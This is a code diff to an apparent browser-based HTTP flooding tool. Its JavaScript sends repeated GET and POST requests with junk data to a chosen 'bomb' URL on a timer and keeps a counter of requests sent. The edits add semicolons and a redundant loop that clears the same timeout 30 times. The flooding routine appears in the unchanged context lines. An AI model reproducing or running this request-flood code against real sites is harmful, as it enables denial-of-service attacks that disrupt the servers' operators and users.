@@ -24,6 +24,7 @@
 	var postdata="qawsedrftgyhujikolpaqwsedrftgyhujikolpaqwsedrftgyhujikolp";
 	var xhr = new XMLHttpRequest();
 	var xhr2 = new XMLHttpRequest();
+	var count = "30";
 	function main()
 	{
 		m_inInterval = document.m_form1.m_tbInterval.value;
@@ -134,11 +135,11 @@
 		{
 			bomb = m_stBomburl
 			//fetch GET
-			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } })
-			fetch(req)
+			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			fetch(req);
 			//fech POST
-			var req2 = new Request(bomb, { method: "POST", mode: "same-origin", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)})
-			fetch(req2)
+			var req2 = new Request(bomb, { method: "POST", mode: "same-origin", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
 		}
 		bombCounter();
 		m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
@@ -151,6 +152,9 @@
 		clearTimeout(m_toDoing);
 		clearTimeout(m_toDoing_XML);
 		clearTimeout(m_toDoing_fetch);
+		for(i = 0; i < count; i++) {
+			clearTimeout(m_toDoing_fetch);
+		}
 		document.all.m_taInfo.value += "\n\n";
 		document.all.m_taInfo.value += "～訪問を中止しました～";
 	}
